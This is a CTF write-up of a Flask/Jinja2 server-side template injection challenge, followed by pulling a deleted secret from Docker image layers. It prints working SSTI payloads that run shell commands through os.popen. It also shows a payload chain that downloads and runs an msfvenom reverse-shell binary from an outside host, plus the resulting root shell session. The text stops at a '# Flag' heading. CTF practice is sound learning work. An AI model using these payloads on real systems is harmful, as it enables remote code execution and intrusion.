Ok Flask Jinja injection time

http://167.99.77.149:31703/?nopain={{%277%27*7}}
```
7777777
```

Research

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

![[Pasted image 20221203234122.png]]

Try remote code execution or something?

https://secure-cookie.io/attacks/ssti/

http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()}}%3C/code%3E

![[Pasted image 20221203234837.png]]

Finding Warnings Class

![[Pasted image 20221203234957.png]]

```python
>>> var = "..." # Put Text from webpage here
>>> l = var.split(",")
>>> for i in range(len(l)):
...     if "warnings.catch_warnings" in l[i]: print(i)
... 
207
>>> 
```

http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()[207]}}%3C/code%3E

```
<class 'warnings.catch_warnings'>
```

## RCE

http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()[207].__init__.__globals__[%27sys%27].modules[%27os%27].popen(%22ls%22).read()}}%3C/code%3E

```
app.py blueprint.img requirements.txt templates
```


http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()[207].__init__.__globals__[%27sys%27].modules[%27os%27].popen(%22cat%20app.py%22).read()}}%3C/code%3E

```python

<code>from flask import Flask, render_template, make_response, request, render_template_string, send_file
from datetime import datetime
import base64

app = Flask(__name__)

@app.route(&#39;/&#39;)
def page2():
    if request.args.get(&#39;nopain&#39;):
        return render_template_string(request.args.get(&#39;nopain&#39;))
    else:
        return render_template(&#39;defendthevillage.html&#39;)

@app.route(&#39;/defendthevillagefrompain&#39;, methods=[&#39;GET&#39;])
def page3():
    try:
        return send_file(&#39;./blueprint.img&#39;)
    except Exception as e:
        return str(e)
if __name__ == &#34;__main__&#34;:
    app.run(host=&#34;0.0.0.0&#34;, port=8086)
</code>
```


Can retrieve image from `/defendthevillagefrompain`

## Image file

```
[hacker@hackerbook 4 Paths of Pain]$ cd blueprint/
[hacker@hackerbook blueprint]$ tar xvf blueprint.img
23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148/
23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148/VERSION
23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148/json
23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148/layer.tar
5311c2bdad7ed9ff9a45d89fbf5f6fd3396eba77024356054e44ea3b2965f0a0/
5311c2bdad7ed9ff9a45d89fbf5f6fd3396eba77024356054e44ea3b2965f0a0/VERSION
5311c2bdad7ed9ff9a45d89fbf5f6fd3396eba77024356054e44ea3b2965f0a0/json
5311c2bdad7ed9ff9a45d89fbf5f6fd3396eba77024356054e44ea3b2965f0a0/layer.tar
54b399bd0253b7800f4c81d5d800917be6cd2345be7030947a7efd9bb4f60043/
54b399bd0253b7800f4c81d5d800917be6cd2345be7030947a7efd9bb4f60043/VERSION
54b399bd0253b7800f4c81d5d800917be6cd2345be7030947a7efd9bb4f60043/json
54b399bd0253b7800f4c81d5d800917be6cd2345be7030947a7efd9bb4f60043/layer.tar
786fa91039940fa3967fb214d152d1b933d6d83dc1dfbc53c70aaceda221c391.json
d0ffc5a8edc8aafbc7f44c0f04ccb85285593f89e3b5dd3eb3525e39e53a06cb/
d0ffc5a8edc8aafbc7f44c0f04ccb85285593f89e3b5dd3eb3525e39e53a06cb/VERSION
d0ffc5a8edc8aafbc7f44c0f04ccb85285593f89e3b5dd3eb3525e39e53a06cb/json
d0ffc5a8edc8aafbc7f44c0f04ccb85285593f89e3b5dd3eb3525e39e53a06cb/layer.tar
manifest.json
repositories
[hacker@hackerbook blueprint]$ binwalk blueprint.img 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive, owner user name: "821e24d35c5207fc2b00ccff278c5cc4", owner group name: "5200aa218e18d09b0823b148/"

[hacker@hackerbook blueprint]$ 
```

Since I done this before (or attempted it at least), looks like docker image
https://0xdf.gitlab.io/flare-on-2021/antioch


just checking the json file which happens to lead to how the blueprint is produced
```json
[hacker@hackerbook blueprint]$ cat 786fa91039940fa3967fb214d152d1b933d6d83dc1dfbc53c70aaceda221c391.json 
{"architecture":"amd64","author":"OMEGALUL \"hector99@jts.tech.gov.sg\"","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","PAIN_METER=99"],"Cmd":["/bin/sh","-c","\"whoami\""],"WorkingDir":"/usr/src/app","ArgsEscaped":true,"OnBuild":null},"created":"2022-11-18T02:49:23.47397059Z","history":[{"created":"2022-11-02T18:25:55.600834827Z","created_by":"/bin/sh -c #(nop) ADD file:29c72d5be8c977acaeb6391aeb23ec27559b594e25a0bb3a6dd280bac2847b7f in / "},{"created":"2022-11-02T18:25:55.892262049Z","created_by":"/bin/sh -c #(nop)  CMD [\"bash\"]","empty_layer":true},{"created":"2022-11-02T18:25:55.892262049Z","created_by":"MAINTAINER OMEGALUL \"hector99@jts.tech.gov.sg\"","comment":"buildkit.dockerfile.v0","empty_layer":true},{"created":"2022-11-02T18:25:55.892262049Z","created_by":"ENV PAIN_METER=99","comment":"buildkit.dockerfile.v0","empty_layer":true},{"created":"2022-11-18T02:26:02.567040981Z","created_by":"MAINTAINER OMEGALUL \"hector99@jts.tech.gov.sg\"","comment":"buildkit.dockerfile.v0","empty_layer":true},{"created":"2022-11-18T02:26:02.567040981Z","created_by":"ENV PAIN_METER=99","comment":"buildkit.dockerfile.v0","empty_layer":true},{"created":"2022-11-18T02:26:02.567040981Z","created_by":"WORKDIR /usr/src/app","comment":"buildkit.dockerfile.v0"},{"created":"2022-11-18T02:49:23.301698469Z","created_by":"COPY secret-message.txt /usr/src/app # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2022-11-18T02:49:23.47397059Z","created_by":"RUN /bin/sh -c rm -rf /usr/src/app/secret-message.txt # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2022-11-18T02:49:23.47397059Z","created_by":"CMD [\"/bin/sh\" \"-c\" \"\\\"whoami\\\"\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:f4a670ac65b68f8757aea863ac0de19e627c0ea57165abad8094eae512ca7dad","sha256:bea894ea35e86bb49ff86fa74c472b632c098a3b1b0e421b6461af76dfd941ae","sha256:c90547c3c83dc1dc3e1715737669eda79f1e7ff9de3028b853385727007939e0","sha256:dbe8bb62320ede485ae457acf2b983d854fea5a2b1aaaffbbe316b571b33fa3d"]}}[hacker@hackerbook blueprint]$ 
```


running docker image

```bash
[hacker@hackerbook blueprint]$ sudo docker load --input blueprint.img 
bea894ea35e8: Loading layer [==================================================>]  3.072kB/3.072kB
c90547c3c83d: Loading layer [==================================================>]  3.584kB/3.584kB
dbe8bb62320e: Loading layer [==================================================>]  3.072kB/3.072kB
Loaded image: stf2022:latest
[hacker@hackerbook blueprint]$ sudo docker run -it stf2022 bash
root@349c4eabb1bf:/usr/src/app# ls
root@349c4eabb1bf:/usr/src/app# ls -al
total 12
drwxr-xr-x 1 root root 4096 Nov 18 02:49 .
drwxr-xr-x 1 root root 4096 Nov 18 02:26 ..
root@349c4eabb1bf:/usr/src/app#
```

```
(base) [hacker@hackerbook 4 Paths of Pain]$ sudo docker history stf2022
[sudo] password for hacker: 
Sorry, try again.
[sudo] password for hacker: 
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
786fa9103994   2 weeks ago   CMD ["/bin/sh" "-c" "\"whoami\""]               0B        buildkit.dockerfile.v0
<missing>      2 weeks ago   RUN /bin/sh -c rm -rf /usr/src/app/secret-me…   0B        buildkit.dockerfile.v0
<missing>      2 weeks ago   COPY secret-message.txt /usr/src/app # build…   72B       buildkit.dockerfile.v0
<missing>      2 weeks ago   WORKDIR /usr/src/app                            0B        buildkit.dockerfile.v0
<missing>      2 weeks ago   ENV PAIN_METER=99                               0B        buildkit.dockerfile.v0
<missing>      2 weeks ago   MAINTAINER OMEGALUL "hector99@jts.tech.gov.s…   0B        buildkit.dockerfile.v0
<missing>      4 weeks ago   ENV PAIN_METER=99                               0B        buildkit.dockerfile.v0
<missing>      4 weeks ago   MAINTAINER OMEGALUL "hector99@jts.tech.gov.s…   0B        buildkit.dockerfile.v0
<missing>      4 weeks ago   /bin/sh -c #(nop)  CMD ["bash"]                 0B        
<missing>      4 weeks ago   /bin/sh -c #(nop) ADD file:29c72d5be8c977aca…   77.8MB    
(base) [hacker@hackerbook 4 Paths of Pain]$ 
```

So I decided to manually search the layers and I found something

```bash
[hacker@hackerbook blueprint]$ ls
23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148  786fa91039940fa3967fb214d152d1b933d6d83dc1dfbc53c70aaceda221c391.json  manifest.json
5311c2bdad7ed9ff9a45d89fbf5f6fd3396eba77024356054e44ea3b2965f0a0  blueprint.img                                                          repositories
54b399bd0253b7800f4c81d5d800917be6cd2345be7030947a7efd9bb4f60043  d0ffc5a8edc8aafbc7f44c0f04ccb85285593f89e3b5dd3eb3525e39e53a06cb
[hacker@hackerbook blueprint]$ cd 23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148/
[hacker@hackerbook 23202ee5821e24d35c5207fc2b00ccff278c5cc45200aa218e18d09b0823b148]$ mkdir test && cp layer.tar test/ && cd test && tar xvf layer.tar
usr/
usr/src/
usr/src/app/
usr/src/app/secret-message.txt
[hacker@hackerbook test]$ ls
layer.tar  usr
[hacker@hackerbook test]$ cat usr/src/app/secret-message.txt 
The last hiding place is located at pollylester/defendingkonohafrompain
[hacker@hackerbook test]$ 
```


## Reverse Shell

view-source:http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()[207].__init__.__globals__[%27sys%27].modules[%27os%27].popen(%22wget%203.132.159.158:19351/reverse.elf%20-O%20reverse.elf%22).read()}}%3C/code%3E

view-source:http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()[207].__init__.__globals__[%27sys%27].modules[%27os%27].popen(%22chmod%207777%20reverse.elf%202%3E%261%22).read()}}%3C/code%3E

view-source:http://167.99.77.149:31703/?nopain=%3Ccode%3E{{%22foo%22.__class__.__base__.__subclasses__()[207].__init__.__globals__[%27sys%27].modules[%27os%27].popen(%22./reverse.elf%202%3E%261%22).read()}}%3C/code%3E


```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=3.132.159.158 LPORT=19351 -f elf -o reverse.elf

```


```bash
(base) [hacker@hackerbook tmp]$ nc -nlvp 4444
Connection from 127.0.0.1:57558
whoami
root
ls
app.py
blueprint.img
requirements.txt
reverse.elf
templates
python -c 'import pty; pty.spawn("/bin/bash")'
root@ng-4pathsofpain-j5nhv-6f76594c54-tkhj4:/app# ls
ls
app.py	blueprint.img  requirements.txt  reverse.elf  templates
root@ng-4pathsofpain-j5nhv-6f76594c54-tkhj4:/app# ls -al
ls -al
total 78488
drwxr-xr-x 1 root root     4096 Dec  3 16:29 .
drwxr-xr-x 1 root root     4096 Dec  3 15:32 ..
-rw-r--r-- 1 root root      603 Dec  1 14:56 app.py
-rw-r--r-- 1 root root 80340480 Dec  1 14:56 blueprint.img
-rw-r--r-- 1 root root       94 Dec  1 14:56 requirements.txt
-rwsrwsrwt 1 root root      194 Dec  3 16:27 reverse.elf
drwxr-xr-x 2 root root     4096 Dec  1 14:56 templates
root@ng-4pathsofpain-j5nhv-6f76594c54-tkhj4:/app# cd   
```

# Flag